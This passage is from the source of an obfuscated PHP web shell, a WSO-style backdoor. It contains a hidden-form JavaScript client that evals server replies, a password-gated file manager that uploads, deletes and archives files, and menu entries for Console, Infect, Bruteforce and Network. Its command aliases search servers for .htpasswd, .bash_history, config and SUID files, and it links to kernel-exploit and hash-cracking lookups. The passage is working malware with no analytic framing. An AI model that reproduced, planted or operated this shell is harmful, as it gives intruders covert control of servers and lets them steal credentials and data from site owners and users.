'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}\r\n\tfunction set(a,c,p1,p2,p3,charset) {\r\n\t\tif(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;\r\n\t\tif(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;\r\n\t\tif(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;\r\n\t\tif(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;\r\n\t\tif(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;\r\n\t\td.mf.a.value = encrypt(d.mf.a.value,'" . $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"] . "');\r\n\t\td.mf.c.value = encrypt(d.mf.c.value,'" . $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"] . "');\r\n\t\td.mf.p1.value = encrypt(d.mf.p1.value,'" . $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"] . "');\r\n\t\td.mf.p2.value = encrypt(d.mf.p2.value,'" . $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"] . "');\r\n\t\td.mf.p3.value = encrypt(d.mf.p3.value,'" . $_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"] . "');\r\n\t\tif(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;\r\n\t}\r\n\tfunction g(a,c,p1,p2,p3,charset) {\r\n\t\tset(a,c,p1,p2,p3,charset);\r\n\t\td.mf.submit();\r\n\t}\r\n\tfunction a(a,c,p1,p2,p3,charset) {\r\n\t\tset(a,c,p1,p2,p3,charset);\r\n\t\tvar params = 'ajax=true';\r\n\t\tfor(i=0;i<d.mf.elements.length;i++)\r\n\t\t\tparams += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);\r\n\t\tsr('" . addslashes($_SERVER['REQUEST_URI']) . "', params);\r\n\t}\r\n\tfunction sr(url, params) {\r\n\t\tif (window.XMLHttpRequest)\r\n\t\t\treq = new XMLHttpRequest();\r\n\t\telse if (window.ActiveXObject)\r\n\t\t\treq = new ActiveXObject('Microsoft.XMLHTTP');\r\n        if (req) {\r\n            req.onreadystatechange = processReqChange;\r\n            req.open('POST', url, true);\r\n            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');\r\n            req.send(params);\r\n        }\r\n\t}\r\n\tfunction processReqChange() {\r\n\t\tif( (req.readyState == 4) )\r\n\t\t\tif(req.status == 200) {\r\n\t\t\t\tvar reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');\r\n\t\t\t\tvar arr=reg.exec(req.responseText);\r\n\t\t\t\teval(arr[2].substr(0, arr[1]));\r\n\t\t\t} else alert('Request error!');\r\n\t}\r\n</script>\r\n<head><body><div style='position:absolute;background-color:rgba(95, 110, 130, 0.3);width:100%;top:0;left:0;'>\r\n<form method=post name=mf style='display:none;'>\r\n<input type=hidden name=a>\r\n<input type=hidden name=c>\r\n<input type=hidden name=p1>\r\n<input type=hidden name=p2>\r\n<input type=hidden name=p3>\r\n<input type=hidden name=charset>\r\n</form>";
            goto nA9tI;
            HkOyr:
            $n = count($path);
            goto SGUgU;
            GggIT:
            if (!empty($GLOBALS['▛'])) {
                $m['Logout'] = 'Logout';
            }
            goto hu5EY;
            Q629j:
            $totalSpace = @disk_total_space($GLOBALS['cwd']);
            goto OTrZW;
            Uq93C:
            if (empty($_POST['charset'])) {
                $_POST['charset'] = $GLOBALS['▜'];
            }
            goto e14XC;
            iIPWb:
            $opt_charsets = '';
            goto VhaxR;
            Al971:
            $drives = "";
            goto VpmL6;
            q3j10:
            $m = array('Sec. Info' => 'SecInfo', 'Files' => 'FilesMan', 'Console' => 'Console', 'Infect' => 'Infect', 'Sql' => 'Sql', 'Php' => 'Php', 'Safe mode' => 'SafeMode', 'String tools' => 'StringTools', 'Bruteforce' => 'Bruteforce', 'Network' => 'Network');
            goto GggIT;
            RQzT3:
            if (strpos('Linux', $kernel) !== false) {
                $explink .= urlencode('Linux Kernel ' . substr($release, 0, 6));
            } else {
                $explink .= urlencode($kernel . ' ' . substr($release, 0, 3));
            }
            goto d4Lyc;
            LpYKY:
            $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
            goto iIPWb;
            uykzT:
            $explink = 'https://noreferer.de/?https://www.exploit-db.com/search/?action=search&description=';
            goto RQzT3;
            qVuU0:
        }
        goto qat6Y;
        DTG4h:
        @ini_set('error_log', NULL);
        goto I2ox0;
        nI0Kt:
        if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . "key"])) {
            prototype(md5($_SERVER['HTTP_HOST']) . "key", $▙);
        }
        goto Uc_nG;
        psmtL:
        function perms($p)
        {
            goto Xd4ct;
            tfROU:
            $i .= $p & 0x20 ? 'r' : '-';
            goto W4_R0;
            W4_R0:
            $i .= $p & 0x10 ? 'w' : '-';
            goto NqLdE;
            X4nup:
            $i .= $p & 0x80 ? 'w' : '-';
            goto hueQ1;
            zZCh2:
            $i .= $p & 0x1 ? $p & 0x200 ? 't' : 'x' : ($p & 0x200 ? 'T' : '-');
            goto vRTT4;
            ITzyP:
            $i .= $p & 0x4 ? 'r' : '-';
            goto PJ7_c;
            XG8re:
            $i .= $p & 0x100 ? 'r' : '-';
            goto X4nup;
            hueQ1:
            $i .= $p & 0x40 ? $p & 0x800 ? 's' : 'x' : ($p & 0x800 ? 'S' : '-');
            goto tfROU;
            NqLdE:
            $i .= $p & 0x8 ? $p & 0x400 ? 's' : 'x' : ($p & 0x400 ? 'S' : '-');
            goto ITzyP;
            Xd4ct:
            if (($p & 0xc000) == 0xc000) {
                $i = 's';
            } elseif (($p & 0xa000) == 0xa000) {
                $i = 'l';
            } elseif (($p & 0x8000) == 0x8000) {
                $i = '-';
            } elseif (($p & 0x6000) == 0x6000) {
                $i = 'b';
            } elseif (($p & 0x4000) == 0x4000) {
                $i = 'd';
            } elseif (($p & 0x2000) == 0x2000) {
                $i = 'c';
            } elseif (($p & 0x1000) == 0x1000) {
                $i = 'p';
            } else {
                $i = 'u';
            }
            goto XG8re;
            PJ7_c:
            $i .= $p & 0x2 ? 'w' : '-';
            goto zZCh2;
            vRTT4:
            return $i;
            goto coVXl;
            coVXl:
        }
        goto Etpe0;
        vi0BU:
        function actionLogout()
        {
            setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
            die('bye!');
        }
        goto yHI4a;
        zjsHI:
        if ($os == 'win') {
            $home_cwd = str_replace("\\", "/", $home_cwd);
            $cwd = str_replace("\\", "/", $cwd);
        }
        goto pQ5ec;
        ug7ML:
        $▘ = true;
        goto gKfZr;
        I7n5V:
        $safe_mode = @ini_get('safe_mode');
        goto wviNQ;
        gKfZr:
        $▜ = 'UTF-8';
        goto LeeSt;
        bcjO8:
        function actionStringTools()
        {
            goto NP0PB;
            qkjCg:
            YCSzmHeader();
            goto pitzW;
            YDm4Z:
            YCSzmFooter();
            goto quVuZ;
            QYO7H:
            if (!function_exists('full_urlencode')) {
                function full_urlencode($p)
                {
                    goto OJpBv;
                    H4E6K:
                    return strtoupper($r);
                    goto USfc8;
                    OJpBv:
                    $r = '';
                    goto Cbl0D;
                    Cbl0D:
                    for ($i = 0; $i < strlen($p); ++$i) {
                        $r .= '%' . dechex(ord($p[$i]));
                    }
                    goto H4E6K;
                    USfc8:
                }
            }
            goto AcW3p;
            pitzW:
            echo '<h1>String conversions</h1><div class=content>';
            goto s4oZY;
            NP0PB:
            if (!function_exists('hex2bin')) {
                function hex2bin($p)
                {
                    return decbin(hexdec($p));
                }
            }
            goto YQW37;
            u8t1R:
            echo "</pre></div><br><h1>Search files:</h1><div class=content>\r\n\t\t<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>\r\n\t\t\t<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>\r\n\t\t\t<tr><td>Path:</td><td><input type='text' name='cwd' value='" . htmlspecialchars($GLOBALS['cwd']) . "' style='width:100%'></td></tr>\r\n\t\t\t<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>\r\n\t\t\t<tr><td></td><td><input type='submit' value='submit'></td></tr>\r\n\t\t\t</table></form>";
            goto LlVrq;
            vddq2:
            echo "</div><br><h1>Search for hash:</h1><div class=content>\r\n\t\t<form method='post' target='_blank' name='hf'>\r\n\t\t\t<input type='text' name='hash' style='width:200px;'><br>\r\n            <input type='hidden' name='act' value='find'/>\r\n\t\t\t<input type='submit' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>\r\n\t\t\t<input type='submit' value='md5.rednoize.com' onclick=\"document.hf.action='https://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>\r\n            <input type='submit' value='fakenamegenerator.com' onclick=\"document.hf.action='https://www.fakenamegenerator.com/';document.hf.submit()\"><br>\r\n\t\t\t<input type='submit' value='hashcrack.com' onclick=\"document.hf.action='https://www.hashcrack.com/index.php';document.hf.submit()\"><br>\r\n\t\t\t<input type='submit' value='toolki.com' onclick=\"document.hf.action='https://toolki.com/';document.hf.submit()\"><br>\r\n\t\t\t<input type='submit' value='fopo.com.ar' onclick=\"document.hf.action='https://fopo.com.ar/';document.hf.submit()\"><br>\r\n\t\t\t<input type='submit' value='md5decrypter.com' onclick=\"document.hf.action='https://www.md5decrypter.com/';document.hf.submit()\"><br>\r\n\t\t</form></div>";
            goto YDm4Z;
            LlVrq:
            function YCSzmRecursiveGlob($path)
            {
                goto o_Hzv;
                o_Hzv:
                if (substr($path, -1) != '/') {
                    $path .= '/';
                }
                goto W0TUA;
                W0TUA:
                $paths = @array_unique(@array_merge(@glob($path . $_POST['p3']), @glob($path . '*', GLOB_ONLYDIR)));
                goto vAf_t;
                vAf_t:
                if (is_array($paths) && is_array($paths)) {
                    foreach ($paths as $▟) {
                        if (@is_dir($▟)) {
                            if ($path != $▟) {
                                YCSzmRecursiveGlob($▟);
                            }
                        } else {
                            if (empty($_POST['p2']) || @strpos(file_get_contents($▟), $_POST['p2']) !== false) {
                                echo "<a href='#' onclick='g(\"FilesTools\",null,\"" . urlencode($▟) . "\", \"view\",\"\")'>" . htmlspecialchars($▟) . "</a><br>";
                            }
                        }
                    }
                }
                goto HwsWz;
                HwsWz:
            }
            goto KNXqd;
            KNXqd:
            if (@$_POST['p3']) {
                YCSzmRecursiveGlob($_POST['c']);
            }
            goto vddq2;
            VM1ul:
            if (!function_exists('hex2ascii')) {
                function hex2ascii($p)
                {
                    goto uQPCr;
                    uQPCr:
                    $r = '';
                    goto ltsXW;
                    Yb_lM:
                    return $r;
                    goto cSByF;
                    ltsXW:
                    for ($i = 0; $i < strLen($p); $i += 2) {
                        $r .= chr(hexdec($p[$i] . $p[$i + 1]));
                    }
                    goto Yb_lM;
                    cSByF:
                }
            }
            goto lXU97;
            RpObj:
            echo "</select></label><input type='submit' value='submit'/> <input type=checkbox name=ajax value=1 " . (@$_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . "> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>" . (empty($_POST['p1']) ? '' : htmlspecialchars(@$_POST['p2'])) . "</textarea></form><pre class='ml1' style='" . (empty($_POST['p1']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
            goto w7K_S;
            kSSRG:
            if (empty($_POST['ajax']) && !empty($_POST['p1'])) {
                prototype(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
            }
            goto qkjCg;
            lXU97:
            if (!function_exists('ascii2hex')) {
                function ascii2hex($p)
                {
                    goto YRk7S;
                    YRk7S:
                    $r = '';
                    goto rEI7h;
                    n8Jtr:
                    return strtoupper($r);
                    goto ypdhV;
                    rEI7h:
                    for ($i = 0; $i < strlen($p); ++$i) {
                        $r .= sprintf('%02X', ord($p[$i]));
                    }
                    goto n8Jtr;
                    ypdhV:
                }
            }
            goto QYO7H;
            zpWeE:
            if (isset($_POST['ajax'])) {
                goto M3upR;
                C2G_n:
                ob_start();
                goto eRlwo;
                eAvnY:
                echo strlen($temp), "\n", $temp;
                goto Y1BgL;
                Y6GDb:
                $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";
                goto eAvnY;
                Y1BgL:
                exit;
                goto ibQgV;
                eRlwo:
                if (in_array($_POST['p1'], $stringTools)) {
                    echo $_POST['p1']($_POST['p2']);
                }
                goto Y6GDb;
                M3upR:
                prototype(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
                goto C2G_n;
                ibQgV:
            }
            goto kSSRG;
            w7K_S:
            if (!empty($_POST['p1'])) {
                if (in_array($_POST['p1'], $stringTools)) {
                    echo htmlspecialchars($_POST['p1']($_POST['p2']));
                }
            }
            goto u8t1R;
            Zv1MG:
            foreach ($stringTools as $k => $v) {
                echo "<option value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
            }
            goto RpObj;
            YQW37:
            if (!function_exists('binhex')) {
                function binhex($p)
                {
                    return dechex(bindec($p));
                }
            }
            goto VM1ul;
            AcW3p:
            $stringTools = array('Base64 encode' => 'base64_encode', 'Base64 decode' => 'base64_decode', 'Url encode' => 'urlencode', 'Url decode' => 'urldecode', 'Full urlencode' => 'full_urlencode', 'md5 hash' => 'md5', 'sha1 hash' => 'sha1', 'crypt' => 'crypt', 'CRC32' => 'crc32', 'ASCII to HEX' => 'ascii2hex', 'HEX to ASCII' => 'hex2ascii', 'HEX to DEC' => 'hexdec', 'HEX to BIN' => 'hex2bin', 'DEC to HEX' => 'dechex', 'DEC to BIN' => 'decbin', 'BIN to HEX' => 'binhex', 'BIN to DEC' => 'bindec', 'String to lower case' => 'strtolower', 'String to upper case' => 'strtoupper', 'Htmlspecialchars' => 'htmlspecialchars', 'String length' => 'strlen');
            goto zpWeE;
            s4oZY:
            echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><label><select name='selectTool'>";
            goto Zv1MG;
            quVuZ:
        }
        goto jskum;
        I2ox0:
        @ini_set('log_errors', 0);
        goto SJoa0;
        gW18U:
        if ($os == 'win') {
            $aliases = array("List Directory" => "dir", "Find index.php in current dir" => "dir /s /w /b index.php", "Find *config*.php in current dir" => "dir /s /w /b *config*.php", "Show active connections" => "netstat -an", "Show running services" => "net start", "User accounts" => "net user", "Show computers" => "net view", "ARP Table" => "arp -a", "IP Configuration" => "ipconfig /all");
        } else {
            $aliases = array("List dir" => "ls -lha", "list file attributes on a Linux second extended file system" => "lsattr -va", "show opened ports" => "netstat -an | grep -i listen", "process status" => "ps aux", "Find" => "", "find all suid files" => "find / -type f -perm -04000 -ls", "find suid files in current dir" => "find . -type f -perm -04000 -ls", "find all sgid files" => "find / -type f -perm -02000 -ls", "find sgid files in current dir" => "find . -type f -perm -02000 -ls", "find config.inc.php files" => "find / -type f -name config.inc.php", "find config* files" => "find / -type f -name \"config*\"", "find config* files in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd files" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd files" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history files" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf files" => "locate httpd.conf", "locate vhosts.conf files" => "locate vhosts.conf", "locate proftpd.conf files" => "locate proftpd.conf", "locate psybnc.conf files" => "locate psybnc.conf", "locate my.conf files" => "locate my.conf", "locate admin.php files" => "locate admin.php", "locate cfg.php files" => "locate cfg.php", "locate conf.php files" => "locate conf.php", "locate config.dat files" => "locate config.dat", "locate config.php files" => "locate config.php", "locate config.inc files" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php files" => "locate config.default.php", "locate config* files " => "locate config", "locate .conf files" => "locate '.conf'", "locate .pwd files" => "locate '.pwd'", "locate .sql files" => "locate '.sql'", "locate .htpasswd files" => "locate '.htpasswd'", "locate .bash_history files" => "locate '.bash_history'", "locate .mysql_history files" => "locate '.mysql_history'", "locate .fetchmailrc files" => "locate '.fetchmailrc'", "locate backup files" => "locate backup", "locate dump files" => "locate dump", "locate priv files" => "locate priv");
        }
        goto RPpeU;
        N4lhb:
        @set_time_limit(0);
        goto FIuqD;
        rJvuU:
        $▛ = "lufix";
        goto ug7ML;
        iB0Kp:
        function actionFilesMan()
        {
            goto Yh06j;
            uNmhK:
            if (class_exists('ZipArchive')) {
                echo "<option value='zip'>+ zip</option><option value='unzip'>- zip</option>";
            }
            goto qbU__;
            zbREe:
            echo "</select></label>";
            goto yGJ1i;
            ISuV1:
            usort($dirs, "cmp");
            goto tlCwS;
            sszwk:
            $GLOBALS['sort'] = $sort;
            goto YV86k;
            ovjJz:
            $l = 0;
            goto jofWd;
            iSL2H:
            if (!empty($_POST['p1'])) {
                if (preg_match('!s_([A-z]+)_(\\d{1})!', $_POST['p1'], $match)) {
                    $sort = array($match[1], (int) $match[2]);
                }
            }
            goto JbPOv;
            wzlt9:
            $dirContent = YCSzmScandir(isset($_POST['c']) ? $_POST['c'] : $GLOBALS['cwd']);
            goto eTQoz;
            trCq4:
            YCSzmHeader();
            goto F3tdG;
            tlCwS:
            $files = array_merge($dirs, $files);
            goto ovjJz;
            qbU__:
            echo "<option value='tar'>+ tar.gz</option>";
            goto zbREe;
            KnYlW:
            global $sort;
            goto x47Ul;
            F3tdG:
            echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
            goto wzlt9;
            yTuUF:
            if (!empty($_COOKIE['act']) && isset($_COOKIE['f']) && is_array($_COOKIE['f'])) {
                echo "<option value='paste'>↳ Paste</option>";
            }
            goto o_R5w;
            Yh06j:
            if (!empty($_COOKIE['f'])) {
                $_COOKIE['f'] = @unserialize($_COOKIE['f']);
            }
            goto F525h;
            F5zti:
            echo "<input type='submit' value='submit'></td></tr></form></table></div>";
            goto f3Xgk;
            x47Ul:
            $sort = array('name', 1);
            goto iSL2H;
            eTQoz:
            if ($dirContent === false) {
                goto ElHqj;
                N7Phm:
                return;
                goto BnEP8;
                kKHRM:
                YCSzmFooter();
                goto N7Phm;
                ElHqj:
                echo 'Can\'t open this folder!';
                goto kKHRM;
                BnEP8:
            }
            goto KnYlW;
            f3Xgk:
            YCSzmFooter();
            goto KJtCC;
            iD_jp:
            for ($i = 0; $i < $n; $i++) {
                $ow = @posix_getpwuid(@fileowner($dirContent[$i]));
                $gr = @posix_getgrgid(@filegroup($dirContent[$i]));
                $tmp = array('name' => $dirContent[$i], 'path' => $GLOBALS['cwd'] . $dirContent[$i], 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 'perms' => viewPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 'size' => @filesize($GLOBALS['cwd'] . $dirContent[$i]), 'owner' => $ow['name'] ? $ow['name'] : @fileowner($dirContent[$i]), 'group' => $gr['name'] ? $gr['name'] : @filegroup($dirContent[$i]));
                if (@is_file($GLOBALS['cwd'] . $dirContent[$i])) {
                    $files[] = array_merge($tmp, array('type' => 'file'));
                } elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) {
                    $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
                } elseif (@is_dir($GLOBALS['cwd'] . $dirContent[$i]) && $dirContent[$i] != ".") {
                    $dirs[] = array_merge($tmp, array('type' => 'dir'));
                }
            }
            goto sszwk;
            JbPOv:
            echo "<script>\r\n\tfunction sa() {\r\n\t\tfor(i=0;i<d.files.elements.length;i++)\r\n\t\t\tif(d.files.elements[i].type == 'checkbox')\r\n\t\t\t\td.files.elements[i].checked = d.files.elements[0].checked;\r\n\t}\r\n</script>\r\n<table width='100%' class='main' cellspacing='0' cellpadding='2'>\r\n<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_" . ($sort[1] ? 0 : 1) . "\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_" . ($sort[1] ? 0 : 1) . "\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_" . ($sort[1] ? 0 : 1) . "\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_" . ($sort[1] ? 0 : 1) . "\")'>Permissions</a></th><th>Actions</th></tr>";
            goto BJSGD;
            P0CXP:
            echo "<tr id=fak><td colspan=7>\r\n\t<input type=hidden name=ne value=''>\r\n\t<input type=hidden name=a value='FilesMan'>\r\n\t<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'>\r\n\t<input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>\r\n\t<label><select name='p1'>";
            goto yTuUF;
            BJSGD:
            $dirs = $files = array();
            goto rEtu9;
            yGJ1i:
            if (!empty($_COOKIE['act']) && isset($_COOKIE['f']) && is_array($_COOKIE['f']) && ($_COOKIE['act'] == 'zip' || $_COOKIE['act'] == 'tar')) {
                echo "&nbsp;file name: <input type=text name=p2 value='YCSzm_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip' ? 'zip' : 'tar.gz') . "'>&nbsp;";
            }
            goto F5zti;
            jofWd:
            foreach ($files as $f) {
                echo '<tr' . ($l ? ' class=l1' : '') . '><td><input type=checkbox name="f[]" value="' . urlencode($f['name']) . '" class=chkbx></td><td><a href=# onclick="' . ($f['type'] == 'file' ? 'g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'view\')">' . htmlspecialchars($f['name']) : 'g(\'FilesMan\',\'' . $f['path'] . '\');" ' . (empty($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>') . '</a></td><td>' . ($f['type'] == 'file' ? viewSize($f['size']) : $f['type']) . '</td><td>' . $f['modify'] . '</td><td>' . $f['owner'] . '/' . $f['group'] . '</td><td><a href=# onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\',\'chmod\')">' . $f['perms'] . '</td><td><a class="tooltip" data-tooltip="Rename" href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'rename\')">R</a> <a class="tooltip" data-tooltip="Touch" href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'touch\')">T</a>' . ($f['type'] == 'file' ? ' <a class="tooltip" data-tooltip="Frame" href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'frame\')">F</a> <a class="tooltip" data-tooltip="Edit" href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'edit\')">E</a> <a class="tooltip" data-tooltip="Download" href="#" onclick="g(\'FilesTools\',null,\'' . urlencode($f['name']) . '\', \'download\')">D</a>' : '') . '</td></tr>';
                $l = $l ? 0 : 1;
            }
            goto P0CXP;
            F525h:
            if (!empty($_POST['p1'])) {
                switch ($_POST['p1']) {
                    case 'uploadFile':
                        if (is_array($_FILES['f']['tmp_name'])) {
                            foreach ($_FILES['f']['tmp_name'] as $i => $tmpName) {
                                if (!@move_uploaded_file($tmpName, $_FILES['f']['name'][$i])) {
                                    echo "Can't upload file!";
                                }
                            }
                        }
                        break;
                    case 'mkdir':
                        if (!@mkdir($_POST['p2'])) {
                            echo "Can't create new dir";
                        }
                        break;
                    case 'delete':
                        goto CxP6E;
                        CxP6E:
                        function deleteDir($path)
                        {
                            goto JiVuU;
                            h3GOz:
                            while (($▟ = readdir($dh)) !== false) {
                                $▟ = $path . $▟;
                                if (basename($▟) == ".." || basename($▟) == ".") {
                                    continue;
                                }
                                $type = filetype($▟);
                                if ($type == "dir") {
                                    deleteDir($▟);
                                } else {
                                    @unlink($▟);
                                }
                            }
                            goto AB7aR;
                            AB7aR:
                            closedir($dh);
                            goto mctcR;
                            JiVuU:
                            $path = substr($path, -1) == '/' ? $path : $path . '/';
                            goto PMBkH;
                            PMBkH:
                            $dh = opendir($path);
                            goto h3GOz;
                            mctcR:
                            @rmdir($path);
                            goto TE51L;
                            TE51L:
                        }
                        goto KySzz;
                        S5jyw:
                        break;
                        goto IBuUn;
                        KySzz:
                        if (is_array(@$_POST['f'])) {
                            foreach ($_POST['f'] as $f) {
                                goto LTNRO;
                                GoLhL:
                                if (is_dir($f)) {
                                    deleteDir($f);
                                } else {
                                    @unlink($f);
                                }
                                goto Getn8;
                                D3esN:
                                $f = urldecode($f);
                                goto GoLhL;
                                LTNRO:
                                if ($f == '..') {
                                    continue;
                                }
                                goto D3esN;
                                Getn8:
                            }
                        }
                        goto S5jyw;
                        IBuUn:
                    case 'paste':
                        goto avHib;
                        CZRNW:
                        unset($_COOKIE['f']);
                        goto vUNbE;
                        vUNbE:
                        setcookie('f', '', time() - 3600);
                        goto LH3NM;
                        avHib:
                        if ($_COOKIE['act'] == 'copy') {
                            function copy_paste($c, $s, $d)
                            {
                                if (is_dir($c . $s)) {
                                    goto u_vP5;
                                    u_vP5:
                                    mkdir($d . $s);
                                    goto dXeA3;
                                    nFE2K:
                                    while (($f = @readdir($h)) !== false) {
                                        if ($f != "." and $f != "..") {
                                            copy_paste($c . $s . '/', $f, $d . $s . '/');
                                        }
                                    }
                                    goto vpIgl;
                                    dXeA3:
                                    $h = @opendir($c . $s);
                                    goto nFE2K;
                                    vpIgl:
                                } elseif (is_file($c . $s)) {
                                    @copy($c . $s, $d . $s);
                                }
                            }
                            foreach ($_COOKIE['f'] as $f) {
                                copy_paste($_COOKIE['c'], $f, $GLOBALS['cwd']);
                            }
                        } elseif ($_COOKIE['act'] == 'move') {
                            function move_paste($c, $s, $d)
                            {
                                if (is_dir($c . $s)) {
                                    goto YYlUu;
                                    YYlUu:
                                    mkdir($d . $s);
                                    goto PZXBR;
                                    PZXBR:
                                    $h = @opendir($c . $s);
                                    goto lMfvg;
                                    lMfvg:
                                    while (($f = @readdir($h)) !== false) {
                                        if ($f != "." and $f != "..") {
                                            copy_paste($c . $s . '/', $f, $d . $s . '/');
                                        }
                                    }
                                    goto EbhTo;
                                    EbhTo:
                                } elseif (@is_file($c . $s)) {
                                    @copy($c . $s, $d . $s);
                                }
                            }
                            foreach ($_COOKIE['f'] as $f) {
                                @rename($_COOKIE['c'] . $f, $GLOBALS['cwd'] . $f);
                            }
                        } elseif ($_COOKIE['act'] == 'zip') {
                            if (class_exists('ZipArchive')) {
                                $zip = new ZipArchive();
                                if ($zip->open($_POST['p2'], 1)) {
                                    goto SI4AT;
                                    SI4AT:
                                    chdir($_COOKIE['c']);
                                    goto bltGZ;
                                    bltGZ:
                                    foreach ($_COOKIE['f'] as $f) {
                                        if ($f == '..') {
                                            continue;
                                        }
                                        if (@is_file($_COOKIE['c'] . $f)) {
                                            $zip->addFile($_COOKIE['c'] . $f, $f);
                                        } elseif (@is_dir($_COOKIE['c'] . $f)) {
                                            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f . '/', FilesystemIterator::SKIP_DOTS));
                                            foreach ($iterator as $key => $value) {
                                                $zip->addFile(realpath($key), $key);
                                            }
                                        }
                                    }
                                    goto A0ggt;
                                    A0ggt:
                                    chdir($GLOBALS['cwd']);
                                    goto KnHeE;
                                    KnHeE:
                                    $zip->close();
                                    goto NMPun;
                                    NMPun:
                                }
                            }
                        } elseif ($_COOKIE['act'] == 'unzip') {
                            if (class_exists('ZipArchive')) {
                                $zip = new ZipArchive();
                                foreach ($_COOKIE['f'] as $f) {
                                    if ($zip->open($_COOKIE['c'] . $f)) {
                                        $zip->extractTo($GLOBALS['cwd']);
                                        $zip->close();
                                    }
                                }
                            }
                        } elseif ($_COOKIE['act'] == 'tar') {
                            goto fMOZ9;
                            tQiWS:
                            ex('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
                            goto NvfOT;
                            NvfOT:
                            chdir($GLOBALS['cwd']);
                            goto tK2JE;
                            fMOZ9:
                            chdir($_COOKIE['c']);
                            goto dKOuc;
                            dKOuc:
                            $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
                            goto tQiWS;
                            tK2JE:
                        }
                        goto CZRNW;
                        LH3NM:
                        break;
                        goto I_wPb;
                        I_wPb:
                    default:
                        if (!empty($_POST['p1'])) {
                            goto x_vaQ;
                            HyOWr:
                            prototype('c', @$_POST['c']);
                            goto ToLlu;
                            vOjOu:
                            prototype('f', serialize(@$_POST['f']));
                            goto HyOWr;
                            x_vaQ:
                            prototype('act', $_POST['p1']);
